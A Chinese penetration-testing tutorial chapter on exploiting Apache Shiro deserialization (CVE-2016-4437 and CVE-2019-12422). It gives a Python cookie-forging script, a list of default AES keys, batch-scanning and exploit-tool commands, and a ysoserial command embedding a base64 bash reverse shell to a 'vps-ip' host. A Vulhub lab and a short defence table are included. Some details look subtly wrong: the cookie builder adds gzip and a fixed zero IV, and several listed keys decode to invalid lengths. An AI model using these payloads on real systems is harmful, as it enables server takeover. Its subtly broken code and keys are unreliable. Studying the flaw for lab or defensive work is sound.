# Day 41：Shiro 反序列化完全攻略（从Cookie指纹到Padding Oracle通杀）

> **🎯 高级专题** | 难度：⭐⭐⭐⭐ | 预计学习：140 分钟

---

# 第41章 Shiro 反序列化完全攻略 🔐

## 开篇引入：一个小小的Cookie，如何干掉整台服务器？🍪🚀

哈喽各位小伙伴！欢迎来到第41章 Shiro反序列化深度攻略！🎉

上一章我们搞定了Java三大杀器之首的Fastjson。今天我们来搞定第二号杀器——**Apache Shiro 反序列化漏洞**！

如果说Fastjson是"JSON解析器引发的血案"，那Shiro就是"一个Cookie拿下服务器"的传奇故事。

先问大家一个场景题（面试高频题，很多人中招💀）：
> 面试官："你在渗透测试时，看到响应Cookie里有一个 `rememberMe=deleteMe` 字段，你第一反应是什么？"

正确答案：
> **"Shiro框架！大概率存在反序列化RCE，直接上工具打！"** 💥

没错！Shiro漏洞的**指纹特征太明显了**——只要有 `rememberMe=deleteMe`，它就像在脑门贴了张"我有漏洞，快来打我"的纸条 😂

这一章，我们从零基础开始：
1. 🔍 **指纹识别**：怎么快速判断目标用了Shiro？（8种方法全告诉你）
2. 🔑 **Shiro-550**：硬编码AES密钥！100个常见密钥一把梭，一打一个准
3. 🧱 **Shiro-721**：Padding Oracle攻击！密钥不知道也能打，Shiro全版本通杀
4. 🍪 **rememberMe Cookie构造全流程**：从反序列化Payload到AES加密到Base64一步一步拆解
5. 🛠️ **工具全解**：ShiroScan、ShiroExploit、ysoserial 三大神器使用教程
6. 📖 **速查表**：100个常见密钥 + 面试高频问答，考前背一背

Shiro漏洞在**护网、红队、CTF**里的出现率，说它排第二没人敢排第一！而且利用极其简单——**只要扫到密钥，复制粘贴就能getshell**！新手拿Shiro练手RCE，成功率最高！

准备好了吗？让我们开始这场"Cookie破解之旅"！🚀

---

## 一、Shiro 是什么？Java 界的"保安大哥" 🛡️

### 大白话解释 🗣️

Apache Shiro 是一个 Java 的**安全框架**（权限管理框架）。
> 大白话：它就是Web应用的"保安大哥" 👮，负责管三件事：
> 1. **认证（Authentication）**：你是谁？（登录验证）
> 2. **授权（Authorization）**：你能干什么？（普通用户/管理员权限）
> 3. **会话管理（Session）**：记住你是谁（下次来不用重新登录）

哪个应用不需要"登录+权限"这一套？所以Shiro和Spring Security是Java里最流行的两大安全框架，国内老项目80%都用Shiro！

---

### 万恶之源：rememberMe = "记住我"功能 🍪

Shiro有个非常贴心的功能：**用户勾选"记住我"之后，7天内访问不用重新登录！**

这个功能是怎么实现的呢？原理如下：

| 步骤 | 发生了什么 |
|-----|-----------|
| ① 用户登录时勾选"记住我" | 浏览器记住我选项 ✅ |
| ② Shiro 把"用户信息+权限信息"序列化成字节 | Java 序列化（二进制） |
| ③ 用**AES密钥**把字节加密 | 防止用户篡改身份 🔐 |
| ④ 加密结果做 Base64 编码 | 变成可打印字符串 |
| ⑤ 放进 Cookie 里，名叫 `rememberMe=xxx` | 存到用户浏览器 🍪 |
| ⑥ 下次用户访问 → 浏览器带着 Cookie 来 |  |
| ⑦ Shiro 拿到 rememberMe → Base64解码 → AES解密 → 反序列化还原对象 | 自动认出这个用户！ |

**发现问题了吗？** 🚨

整个流程的第⑦步——**Shiro收到rememberMe之后，会直接反序列化解密后的字节！**

那如果：
1. **攻击者知道AES密钥是什么** → 自己加密一个"恶意的序列化Payload"
2. 把加密结果伪装成 rememberMe Cookie 发给服务器
3. 服务器解密 → 反序列化 → **执行Payload里的恶意代码** → RCE！💥

**这就是 Shiro-550 漏洞的原理！** 🎯

---

### 记住我 流程图 + 漏洞攻击路径对比图

<svg width="800" height="420" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="shirobg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ecfdf5"/>
      <stop offset="100%" stop-color="#ecfeff"/>
    </linearGradient>
    <marker id="arrS" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#059669"/></marker>
    <marker id="arrR" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#dc2626"/></marker>
  </defs>
  <rect width="800" height="420" rx="16" fill="url(#shirobg)"/>
  <text x="200" y="30" text-anchor="middle" fill="#047857" font-weight="bold" font-size="17">✅ 正常流程：用户登录</text>
  <text x="600" y="30" text-anchor="middle" fill="#dc2626" font-weight="bold" font-size="17">💥 攻击流程：Shiro-550 RCE</text>
  <!-- 分割线 -->
  <line x1="400" y1="50" x2="400" y2="395" stroke="#999" stroke-width="1" stroke-dasharray="6,4"/>
  <!-- 正常流程 左 -->
  <g transform="translate(30,55)"><rect x="0" y="0" width="340" height="335" rx="14" fill="#fff" stroke="#10b981" stroke-width="2"/>
    <text x="170" y="28" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="14">正常用户访问 Shiro 网站</text>
    <g transform="translate(15,45)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#d1fae5"/>
      <text x="155" y="18" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="12">① 用户登录，勾选"记住我"</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">用户名+密码 + 记住我 ☑</text>
    </g>
    <line x1="170" y1="83" x2="170" y2="95" stroke="#059669" stroke-width="2" marker-end="url(#arrS)"/>
    <g transform="translate(15,95)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#d1fae5"/>
      <text x="155" y="18" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="12">② Shiro：序列化用户身份 → AES加密</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">AES key: kPH+bIxk5D2deZiIxcaaaA==（默认密钥）</text>
    </g>
    <line x1="170" y1="133" x2="170" y2="145" stroke="#059669" stroke-width="2" marker-end="url(#arrS)"/>
    <g transform="translate(15,145)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#d1fae5"/>
      <text x="155" y="18" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="12">③ Base64编码 → 放进 rememberMe Cookie</text>
      <text x="155" y="33" text-anchor="middle" font-family="Consolas" font-size="10" fill="#000">rememberMe=Z3Vvb3hY2F...（一大串Base64）</text>
    </g>
    <line x1="170" y1="183" x2="170" y2="195" stroke="#059669" stroke-width="2" marker-end="url(#arrS)"/>
    <g transform="translate(15,195)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#d1fae5"/>
      <text x="155" y="18" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="12">④ 下次访问带着Cookie来 🍪</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">浏览器自动带上 rememberMe=xxx</text>
    </g>
    <line x1="170" y1="233" x2="170" y2="245" stroke="#059669" stroke-width="2" marker-end="url(#arrS)"/>
    <g transform="translate(15,245)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#a7f3d0" stroke="#059669" stroke-width="2"/>
      <text x="155" y="18" text-anchor="middle" fill="#065f46" font-weight="bold" font-size="12">⑤ Shiro：解密 → 反序列化 → 认出用户 ✅</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">自动登录成功！不用再输密码了！</text>
    </g>
    <line x1="170" y1="283" x2="170" y2="295" stroke="#059669" stroke-width="2" marker-end="url(#arrS)"/>
    <g transform="translate(15,295)"><rect x="0" y="0" width="310" height="30" rx="8" fill="#10b981"/>
      <text x="155" y="20" text-anchor="middle" fill="#fff" font-weight="bold" font-size="13">🎉 正常流程 完美闭环</text>
    </g>
  </g>
  <!-- 攻击流程 右 -->
  <g transform="translate(430,55)"><rect x="0" y="0" width="340" height="335" rx="14" fill="#fff" stroke="#dc2626" stroke-width="2"/>
    <text x="170" y="28" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="14">😈 黑客攻击 Shiro 网站</text>
    <g transform="translate(15,45)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#fee2e2"/>
      <text x="155" y="18" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="12">① 指纹识别：看到 deleteMe Cookie</text>
      <text x="155" y="33" text-anchor="middle" font-family="Consolas" font-size="10" fill="#000">Set-Cookie: rememberMe=deleteMe</text>
    </g>
    <line x1="170" y1="83" x2="170" y2="95" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"/>
    <g transform="translate(15,95)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#fee2e2"/>
      <text x="155" y="18" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="12">② 拿默认密钥 / 扫密钥库！🔑</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">kPH+bIxk5D2deZiIxcaaaA== 命中率最高！</text>
    </g>
    <line x1="170" y1="133" x2="170" y2="145" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"/>
    <g transform="translate(15,145)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#fee2e2"/>
      <text x="155" y="18" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="12">③ ysoserial 生成 RCE Payload 🔨</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">CommonsBeanutils1 链 → 命令执行字节码</text>
    </g>
    <line x1="170" y1="183" x2="170" y2="195" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"/>
    <g transform="translate(15,195)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#fee2e2"/>
      <text x="155" y="18" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="12">④ AES加密（用猜到的密钥）→ Base64</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">构造恶意 rememberMe=恶意加密串 🍪</text>
    </g>
    <line x1="170" y1="233" x2="170" y2="245" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"/>
    <g transform="translate(15,245)"><rect x="0" y="0" width="310" height="38" rx="8" fill="#fecaca" stroke="#dc2626" stroke-width="3"/>
      <text x="155" y="18" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">🔥⑤ 发送Cookie → 服务器解密 → 反序列化！</text>
      <text x="155" y="33" text-anchor="middle" font-size="10" fill="#000">CommonsCollections链触发 Runtime.exec()</text>
    </g>
    <line x1="170" y1="283" x2="170" y2="295" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"/>
    <g transform="translate(15,295)"><rect x="0" y="0" width="310" height="30" rx="8" fill="#dc2626"/>
      <text x="155" y="20" text-anchor="middle" fill="#fff" font-weight="bold" font-size="13">💥 RCE成功！服务器沦陷！</text>
    </g>
  </g>
</svg>

---

## 二、Shiro 指纹识别（8种方法判断Shiro）🔍

**第一步永远是确认目标有没有用Shiro！** 不然工具白跑半天。

### 方法①：看 Cookie 响应头（最简单！90%命中）🎯

随便给目标发一个请求，看响应头里的 `Set-Cookie`：

| 看到这个字段 | 100%是Shiro！ |
|------------|--------------|
| `Set-Cookie: rememberMe=deleteMe;` | ✅ Shiro确认！ |

**为什么是 deleteMe？** 
- 你发的请求里没有有效的 rememberMe Cookie → Shiro想删除这个Cookie → 就会返回 `rememberMe=deleteMe`，意思是"浏览器你把这个Cookie删了吧"
- 所以只要看到 deleteMe，就等于 Shiro 举着个"我是Shiro快来打我"的牌子 😂

Burp Suite里长这样：
```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=xxxxxxx; Path=/
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Mon, 01-Jan-2024 00:00:00 GMT
```

---

### 方法②：构造 rememberMe=1 测试（方法①看不到时用这个）🤔

有些网站第一次访问不会主动设置Cookie。那我们就主动发一个假的 `rememberMe`：

```http
GET / HTTP/1.1
Host: 目标IP
Cookie: rememberMe=1   # 随便写个假的值
```

看响应：
- 如果返回 `Set-Cookie: rememberMe=deleteMe` → ✅ 是Shiro！
- 没返回 deleteMe → ❌ 不是

---

### 方法③~⑧：其他辅助判断

| 编号 | 方法 | 表现 |
|-----|------|------|
| ③ | 看登录路径 | 路径含有 `/login.jsp`、`shiro-cas` 等特征 |
| ④ | 看静态资源 | HTML里引用了 `/shiro/` 开头的JS/CSS |
| ⑤ | 看报错信息 | 报错里出现 `org.apache.shiro` 包名 |
| ⑥ | 看默认登录页 | Shiro自带的登录页很有特色（用户名密码登录框风格） |
| ⑦ | 指纹工具扫 | whatweb、wappalyzer 插件能识别出 Apache Shiro |
| ⑧ | Favicon 哈希比对 | Shiro默认图标有特定的favicon hash值 |

---

## 三、Shiro-550 漏洞：硬编码密钥一把梭！🔑💥

### CVE-2016-4437 漏洞基本信息 📋
- **CVE编号**：CVE-2016-4437（Shiro-550）
- **漏洞原因**：Shiro默认的AES加密密钥是**写死在代码里的硬编码！** 而且官方示例、教程、开源项目全抄这个密钥
- **默认密钥（命中率最高！抄作业第一名）**：
  ```
  kPH+bIxk5D2deZiIxcaaaA==
  ```
  这一个密钥就能打中全网 **50% 以上**的Shiro漏洞！💥
- **影响版本**：Shiro < 1.2.5
- **漏洞危害**：远程代码执行（RCE），直拿服务器权限

### 为什么有这么多密钥？🔐

因为开发配置Shiro的时候，要在 `shiro.ini` 或 `application.yml` 里写 cipherKey：

```ini
# Shiro 记住我 加密密钥（很多人直接抄官方示例里的！）
securityManager.rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==
```

结果：
- 官方文档、CSDN博客、B站教程 → 写的全是这同一个密钥
- 老项目抄新项目 → 新项目抄github → 全网80%的密钥就那几十个！

所以我们做了一个"**100个常见Shiro密钥库**"，扫一遍，大概率能命中！

---

### 记住我 Cookie 构造全流程（加密前 → 加密后）🔨⚙️

很多新手只会用工具，不知道rememberMe到底是怎么构造出来的。今天一步一步拆解给你看：

**整个流程 = ysoserial生成Payload → Gzip压缩 → AES-128-CBC加密 → Base64编码 → 塞进Cookie**

| 步骤 | 操作 | 输入 | 输出 |
|-----|------|------|------|
| ① | **ysoserial 生成反序列化Payload** | 命令 `touch /tmp/pwned` | 序列化后的恶意字节数组（CommonsBeanutils1链等） |
| ② | **Gzip 压缩** | ①的字节数组 | 压缩后的字节（减少长度） |
| ③ | **AES-128-CBC 加密** | ②的字节 + 密钥（16字节Base64解码）+ IV（随机16字节，放在最前面） | AES密文 = [IV（16字节）] + [加密后的Payload] |
| ④ | **Base64 编码** | ③的字节 | 一串Base64字符串 → 这就是 rememberMe 的值！🍪 |

伪代码实现（Python版）：
```python
import base64, gzip, subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 第①步：生成ysoserial Payload（CB1链）
def gen_payload(command):
    p = subprocess.run(
        ['java', '-jar', 'ysoserial.jar', 'CommonsBeanutils1', command],
        capture_output=True
    )
    return p.stdout  # 序列化字节

# 第②③④步：Shiro加密流程
def shiro_encrypt(payload_bytes, key_b64):
    key = base64.b64decode(key_b64)          # AES密钥解码
    compressed = gzip.compress(payload_bytes) # Gzip压缩
    iv = b'\x00' * 16                         # IV向量（CBC模式需要）
    cipher = AES.new(key, AES.MODE_CBC, iv)   # AES-128-CBC加密器
    ct_bytes = cipher.encrypt(pad(compressed, 16))
    result = iv + ct_bytes                    # 记得IV放最前面！
    return base64.b64encode(result).decode()  # Base64编码 -> Cookie值

# 使用：
payload = gen_payload("touch /tmp/pwned")
cookie_value = shiro_encrypt(payload, "kPH+bIxk5D2deZiIxcaaaA==")
# Cookie: rememberMe={cookie_value}
```

---

### Shiro-550 实战操作流程（手把手带练）🛠️

#### 第一步：Vulhub起Shiro靶场
```bash
cd /root/vulhub/shiro/CVE-2016-4437
docker-compose up -d
# 访问 http://IP:8080 → 看到登录页面
```

#### 第二步：扫密钥（确认Shiro-550 + 找到正确密钥）✅
```bash
# 用 ShiroScan
python3 ShiroScan.py -u http://目标IP:8080/
```

结果大概长这样：
```
[*] 目标: http://目标IP:8080
[+] 存在 Shiro 框架！指纹特征: rememberMe=deleteMe
[*] 开始爆破密钥，共 120 个候选...
[*] 尝试密钥: kPH+bIxk5D2deZiIxcaaaA==
[+] 🔑 命中目标密钥 -> kPH+bIxk5D2deZiIxcaaaA=
[*] 当前可用Gadget链: CommonsBeanutils1, CommonsCollections10, ...
```

扫到密钥的那一刻，**漏洞已经利用成功99%了！** 🎉

#### 第三步：生成Payload + 打RCE
```bash
# 方法A：用 ShiroExploit GUI 工具（强烈推荐新手！点点点就行）
java -jar ShiroExploit.jar
# 界面里填: 目标URL、密钥（kPH+...）、Gadget选 CB1、命令填touch /tmp/pwned
# 点击"执行" -> 成功！

# 方法B：命令行手动打
# 1. VPS起LDAP/RMI + 恶意HTTP服务（上一章Fastjson用过的marshalsec同样适用）
# 2. 或者直接CB1本地链（更稳！）：
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/shiro_pwned" > payload.ser
# 3. Python脚本AES加密这个payload，构造Cookie发过去
```

#### 第四步：验证成功！
```bash
# 进入靶机容器
docker exec -it 容器ID /bin/bash
ls /tmp/
# 看到 shiro_pwned 文件 → 成功！🎉
```

---

### Top 20 常见 Shiro 密钥（背下来，手测的时候用）📝

```
1.  kPH+bIxk5D2deZiIxcaaaA==       （原版默认，命中率第一！⭐⭐⭐⭐⭐）
2.  2AvVhdsgUs0FSA3SDFAdag==           （老项目常见）
3.  4AvVhmFLUs0KTA3Kprsdag==           （CSDN博客热门示例）
4.  Z3VucwAAAAAAAAAAAAAAAA==          （老版本Shiro）
5.  wGiHpl7TmyoDwqQqHEX+XQ==          （很多开源项目在用）
6.  zSyqCqFqz3aAFTYw0xY86Q==
7.  fCq/Szmc1ZLwlHrW5x6Gdw==
8.  6ZmI6I2j5Y+R5aSn5ZOlAA==
9.  a2V5cy50eHQ=                       （base64编码的keys.txt）
10. bWljcm9zAAAAAAAAAAAAAAAAAAA=
11. MTIzNDU2Nzg5MGFiY2RlZg==           （1234567890abcdef的base64）
12. U3ByaW5nQmxhZGUAAAAAAA==           （SpringBoot集成Shiro常见）
13. Y29tLmRiY3J5LnNlY3VyaXR5LmNyeXB0bw==
14. Y3VzdG9tUGFzc3dvcmRTYWx0AAAAAAAAAAA=
15. SHVBTGVzc0RpZ2VzdFNlbGYAAAAAAAAAAA=
16. RmlyZWZseVMAAAAAAAAAAAAAAAAAAAAAA== （Firefly 框架集成）
17. c2hpbm9yX3NlY3VyaXR5X2tleQAAAAAAA=
18. amVla3VzX3NlY3VyaXR5X2tleQAAAAAAA= （JeecgBoot 低代码平台）
19. am9uZXNBZG1pbgAAAAAAAAAAAAAAAAAA=
20. Qm9vbnRlck1hbmFnZXIAAAAAAAAAAAAAAA= （常见）
```

> 💡 完整版100个密钥直接在 ShiroScan.py 的 keys 数组里！GitHub一搜就有现成的。

---

## 四、Shiro-721：Padding Oracle 攻击通杀！🧱⚡

### 问题来了：如果密钥不在库里怎么办？😱

Shiro-550的前提是**你必须知道AES密钥**。但如果：
- 开发改了密钥 → 没在100个常见密钥里
- Shiro版本升级到了1.2.5+ → 默认不再硬编码密钥了

这时候是不是就没办法了？**错！Shiro-721来了！**

### CVE-2019-12422（Shiro-721）📋
- **漏洞原因**：AES-CBC模式解密时，填充（Padding）错误和填充正确返回的响应不一样！攻击者可以通过**逐字节差异**，在**完全不知道密钥**的情况下，把一个合法的rememberMe Cookie"篡改"成恶意Payload的Cookie！
- **影响版本**：Apache Shiro 1.2.5 ~ 1.4.1
- **漏洞特点**：
  - ✅ **不需要知道密钥！**（只要有一个合法的登录用户账号即可）
  - ✅ **Shiro 1.2.5 到 1.4.1 通杀！**
  - ❌ **速度慢**：Padding Oracle是逐字节爆破，一般需要30~120分钟才能构造完Payload
  - ❌ **需要合法账号**：你得先有一个能正常登录的普通用户账号，拿到它的合法rememberMe Cookie（作为"种子"）

---

### Padding Oracle 原理（大白话版）🧱💡

新手听到"Padding Oracle"肯定懵。我用"**猜保险柜密码**"的故事讲明白：

> 🚪 你面前有一个保险柜（Shiro服务器），保险柜密码是4位数字。你每次输入密码后保险柜都有两种反馈：
> - ❌ "密码错了" → 立刻弹出蜂鸣声（对应 Shiro：解密失败，报错）
> - ✅ "密码对了" → 咔哒一声开锁（对应 Shiro：Padding校验通过，尝试反序列化）

Padding Oracle攻击就是：**利用这个"是否报错"的二进制反馈，一个字节一个字节地猜正确的密文！**

AES-CBC的分组是16字节一组：
- 每次猜测1个字节 → 最多256次尝试（平均128次）
- 一个Payload几百字节 → 几万个请求 → 30~120分钟
- 但只要出网环境允许，就一定能爆破出来！💪

（具体密码学细节新手不用深究，知道"能用、慢、通杀"三个点就行～）

---

### Shiro-721 实战操作流程 🛠️

#### 第一步：准备条件 ✅
```
1. 目标存在 Shiro 指纹（deleteMe）
2. 你有一个合法的普通用户账号（比如 user/user123）
3. 登录后拿到浏览器里那个**合法的 rememberMe Cookie**（长字符串）
4. 目标不出网（出网的话用DNSLog更快）→ 选好Gadget链
```

#### 第二步：用 shiro721exp.py 跑 Padding Oracle
```bash
# GitHub搜索下载 shiro721-exploit
python3 shiro721_exp.py \
    -u "http://目标IP:8080/" \
    -c "合法用户登录后的rememberMe=xxxxx完整Cookie" \
    -g CommonsBeanutils1 \
    -cmd "touch /tmp/shiro721_pwned"

# 进度大概：
[*] 总字节数: 384, 共24块, 预计耗时 45 分钟
[*] Block 1 / 24 ... done (3 min)
[*] Block 2 / 24 ... done (3 min)
...
[+] 构造完成！Payload Cookie: xxxxxx
[+] 发送成功！检查命令是否执行
```

跑完之后，目标 `/tmp/shiro721_pwned` 文件就被创建了 → **RCE成功！** 🎉

> 💡 新手 Tip：Shiro-721跑起来比较慢，建议开tmux/screen后台跑。但是一旦成功，**任何密钥都挡不住！** 这就是为什么它叫"通杀"！

---

## 五、Shiro 实战三大神器使用教程 🛠️

### 神器一：ShiroScan（扫描+密钥爆破）✨
```bash
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
pip3 install -r requirements.txt

# 单个URL扫描（指纹 + 120密钥爆破 + 自动检测Gadget链）
python3 ShiroScan.py -u http://目标IP:8080/

# 批量扫描目标列表（护网必用！）
python3 ShiroScan.py -f urls.txt
```
输出示例：
```
[+] URL: http://目标1:8080/  🔑Key: kPH+bIxk5D2deZiIxcaaaA==  ✅Gadget: CommonsBeanutils1
[-] URL: http://目标2:8080/  不是Shiro
[+] URL: http://目标3:8080/  🔑Key: 4AvVhmFLUs0KTA3Kprsdag==   ✅Gadget: CB1,CC10
```

### 神器二：ShiroExploit（图形界面！新手首选）🖥️
```bash
# GitHub搜索下载 ShiroExploit-2.4.jar（GUI版）
java -jar ShiroExploit-2.4.jar
```
**界面操作三步走**：
1. 📝 目标URL填进去 → 点"检测Shiro" → 确认是Shiro
2. 🔑 密钥栏 → 点"一键爆破常见密钥" → 等着命中就行
3. 🚀 命令栏填 `touch /tmp/pwned` → 选Gadget（推荐 CB1）→ 点"执行"！
   - 或者直接选"反连Shell"，填你VPS的IP和监听端口 → 点"一键反弹" → nc -lvvp 7777 接Shell！

新手打Shiro，用这个GUI工具成功率90%以上！👏

### 神器三：ysoserial（Gadget链生成器）🔨
Shiro最终用的Payload还是ysoserial生成的，推荐的链：

| 链名 | 适用场景 | 备注 |
|-----|---------|------|
| **CommonsBeanutils1** | ⭐⭐⭐⭐⭐ 首选 | 只要目标有CB依赖（SpringBoot项目基本都有），稳得一批！ |
| CommonsCollections1~7 | CVE-2016老项目 | 需要目标有 commons-collections 3.x/4.x |
| CommonsCollections10 | 新版本CC4链 | CC4依赖版本 |
| Jdk7u21 | 纯JDK链，不需要第三方依赖 | 目标环境比较干净的时候用 |

命令：
```bash
# 格式: java -jar ysoserial.jar 链名 "命令" > payload.ser
java -jar ysoserial.jar CommonsBeanutils1 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMtaXAvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}" \
  > payload.ser
# 然后自己写脚本加密这个payload.ser就行～
```

---

## 六、Shiro 指纹识别+漏洞利用完整决策树 🌳

<svg width="800" height="440" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="treebg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#eff6ff"/>
      <stop offset="100%" stop-color="#faf5ff"/>
    </linearGradient>
    <marker id="arrT" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#1d4ed8"/></marker>
  </defs>
  <rect width="800" height="440" rx="14" fill="url(#treebg)"/>
  <text x="400" y="30" text-anchor="middle" fill="#1e3a8a" font-weight="bold" font-size="20">🌳 Shiro 漏洞利用决策树（实战跟着走就行）</text>
  <!-- 根节点 -->
  <g transform="translate(280,55)"><rect x="0" y="0" width="240" height="50" rx="12" fill="#1d4ed8"/>
    <text x="120" y="22" text-anchor="middle" fill="#fff" font-weight="bold" font-size="15">🎯 发现目标网站</text>
    <text x="120" y="42" text-anchor="middle" fill="#dbeafe" font-size="11">发 Cookie: rememberMe=1 → 看响应</text>
  </g>
  <!-- 分支1 不是Shiro -->
  <line x1="340" y1="105" x2="200" y2="140" stroke="#888" stroke-width="2" marker-end="url(#arrT)"/>
  <g transform="translate(60,140)"><rect x="0" y="0" width="200" height="40" rx="10" fill="#cbd5e1"/>
    <text x="100" y="18" text-anchor="middle" fill="#334155" font-weight="bold" font-size="13">❌ 没有 deleteMe Cookie</text>
    <text x="100" y="34" text-anchor="middle" fill="#0f172a" font-size="11">→ 不是Shiro，换漏洞方向</text>
  </g>
  <!-- 分支2 是Shiro -->
  <line x1="460" y1="105" x2="600" y2="140" stroke="#1d4ed8" stroke-width="2.5" marker-end="url(#arrT)"/>
  <g transform="translate(500,140)"><rect x="0" y="0" width="230" height="45" rx="10" fill="#bfdbfe" stroke="#1d4ed8" stroke-width="2"/>
    <text x="115" y="18" text-anchor="middle" fill="#1e3a8a" font-weight="bold" font-size="14">✅ 确认存在 Shiro 框架！</text>
    <text x="115" y="38" text-anchor="middle" fill="#000" font-size="11">→ 上 ShiroScan 跑常见密钥</text>
  </g>
  <!-- 密钥命中? -->
  <line x1="615" y1="185" x2="615" y2="210" stroke="#1d4ed8" stroke-width="2.5" marker-end="url(#arrT)"/>
  <g transform="translate(520,210)"><polygon points="100,0 200,40 100,80 0,40" fill="#fde68a" stroke="#b45309" stroke-width="2"/>
    <text x="100" y="35" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">🔑 常见密钥</text>
    <text x="100" y="55" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">库命中了吗？</text>
  </g>
  <!-- Yes Shiro550 -->
  <line x1="620" y1="290" x2="420" y2="320" stroke="#059669" stroke-width="2.5" marker-end="url(#arrT)"/>
  <text x="520" y="300" text-anchor="middle" fill="#047857" font-weight="bold" font-size="12">✅ 命中！</text>
  <g transform="translate(230,320)"><rect x="0" y="0" width="250" height="55" rx="12" fill="#dcfce7" stroke="#16a34a" stroke-width="2"/>
    <text x="125" y="22" text-anchor="middle" fill="#14532d" font-weight="bold" font-size="14">⚡ Shiro-550 RCE！</text>
    <text x="125" y="43" text-anchor="middle" fill="#000" font-size="11">CB1链 + AES加密 → 构造Cookie发请求 →</text>
    <text x="125" y="58" text-anchor="middle" fill="#dc2626" font-weight="bold" font-size="11">💥 getshell（5~30秒搞定！）</text>
  </g>
  <!-- No Shiro721 -->
  <line x1="720" y1="290" x2="720" y2="320" stroke="#dc2626" stroke-width="2.5" marker-end="url(#arrT)"/>
  <text x="760" y="300" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">❌ 没命中</text>
  <g transform="translate(520,320)"><rect x="0" y="0" width="260" height="55" rx="12" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
    <text x="130" y="22" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="14">🧱 Shiro-721 Padding Oracle！</text>
    <text x="130" y="43" text-anchor="middle" fill="#000" font-size="11">先拿到合法Cookie → 跑Padding Oracle</text>
    <text x="130" y="58" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="11">🔨 30~120分钟 通杀1.2.5~1.4.1！</text>
  </g>
  <!-- 底部最后 -->
  <g transform="translate(160,395)"><rect x="0" y="0" width="480" height="35" rx="12" fill="#1e293b"/>
    <text x="240" y="16" text-anchor="middle" fill="#fbbf24" font-weight="bold" font-size="13">⭐ 实战中 80% 的Shiro都能被120个常见密钥打中 → 优先Shiro-550！</text>
    <text x="240" y="32" text-anchor="middle" fill="#fbbf24" font-size="10">实在打不中 + 有合法账号 + 有时间 → 再上 Shiro-721</text>
  </g>
</svg>

---

## 七、防御方案（蓝队必看）🛡️

| 防御手段 | 能防住 | 推荐度 |
|---------|-------|-------|
| **① 升级 Shiro ≥ 1.8.0 最新版** | Shiro-550 + Shiro-721 官方修复 | ⭐⭐⭐⭐⭐ |
| **② 自己随机生成高强度密钥！**（不能抄网上的） | 杜绝 Shiro-550 常见密钥扫描 | ⭐⭐⭐⭐⭐ 最关键！ |
| 生成密钥命令：`keytool -genseckey -alg AES -keysize 128` → 把结果写进配置 |  |  |
| **③ 升级 CB/CC 依赖到安全版本** | CommonsBeanutils 1.9.2+ 修了链 | ⭐⭐⭐⭐ |
| **④ WAF 拦截超长 Base64 Cookie** | 能挡住多数自动化工具 | ⭐⭐⭐ |
| **⑤ 服务器限制出网（LDAP/RMI/HTTP外连）** | 即使被反序列化，也加载不到远程恶意类 | ⭐⭐⭐⭐⭐ 架构层防护 |

---

## 本章总结 📝

Shiro是Java Web里**实战价值最高、对新手最友好**的RCE漏洞！

### 核心知识回顾 ✅

1. **指纹识别**：响应头 `Set-Cookie: rememberMe=deleteMe` → Shiro确认！
2. **Shiro-550（CVE-2016-4437）**：硬编码AES密钥 → 常见密钥库一把梭 → 80%命中率
3. **Cookie构造流程**：ysoserial生成Payload → Gzip压缩 → AES-CBC加密（IV放最前）→ Base64编码
4. **首选Gadget**：CommonsBeanutils1（CB1）→ SpringBoot环境基本必中
